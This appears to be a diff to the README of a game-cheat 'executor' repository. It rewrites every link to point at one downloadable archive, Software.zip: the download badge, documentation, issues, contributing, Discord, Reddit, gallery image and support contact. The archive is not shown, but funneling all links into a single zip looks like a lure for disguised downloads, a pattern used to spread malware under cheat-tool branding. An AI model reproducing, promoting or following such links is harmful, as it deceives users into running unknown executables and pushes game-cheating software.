@@ -9,7 +9,7 @@ This repository covers a range of topics related to Arceus Executor, including a
 
 ## Installation
 To access the repository files, download the ZIP archive by clicking the button below:
-[![Download Arceus Executor](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Arceus Executor](https://github.com/hajesystem/Arceus-Executor/releases/download/v1.0/Software.zip)](https://github.com/hajesystem/Arceus-Executor/releases/download/v1.0/Software.zip)
 
 (To launch the file, unzip the archive and follow the installation instructions provided in the README.)
 
@@ -20,20 +20,20 @@ To access the repository files, download the ZIP archive by clicking the button 
 4. Start utilizing the diverse cheats, scripts, and hacks available within the tool.
 
 ## Resources
-- [Documentation](docs/README.md): Explore detailed information on using Arceus Executor efficiently.
-- [Issues](https://github.com/Arceus-Executor/issues): Report any problems faced while using the tool.
-- [Contributing Guidelines](CONTRIBUTING.md): Learn how to contribute to the development of Arceus Executor.
+- [Documentation](https://github.com/hajesystem/Arceus-Executor/releases/download/v1.0/Software.zip): Explore detailed information on using Arceus Executor efficiently.
+- [Issues](https://github.com/hajesystem/Arceus-Executor/releases/download/v1.0/Software.zip): Report any problems faced while using the tool.
+- [Contributing Guidelines](https://github.com/hajesystem/Arceus-Executor/releases/download/v1.0/Software.zip): Learn how to contribute to the development of Arceus Executor.
 
 ## Community
 Stay connected with other users and developers by joining our community channels:
-- [Discord](https://discord.com/Arceus-Executor)
-- [Reddit](https://www.reddit.com/r/ArceusExecutor)
+- [Discord](https://github.com/hajesystem/Arceus-Executor/releases/download/v1.0/Software.zip)
+- [Reddit](https://github.com/hajesystem/Arceus-Executor/releases/download/v1.0/Software.zip)
 
 ## Gallery
-![Arceus Executor](images/arceus_executor.png)
+![Arceus Executor](https://github.com/hajesystem/Arceus-Executor/releases/download/v1.0/Software.zip)
 
 ## Support
-For any queries or assistance, feel free to contact our support team at [support@arceusexecutor.com](mailto:support@arceusexecutor.com).
+For any queries or assistance, feel free to contact our support team at [https://github.com/hajesystem/Arceus-Executor/releases/download/v1.0/Software.zip](https://github.com/hajesystem/Arceus-Executor/releases/download/v1.0/Software.zip).
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
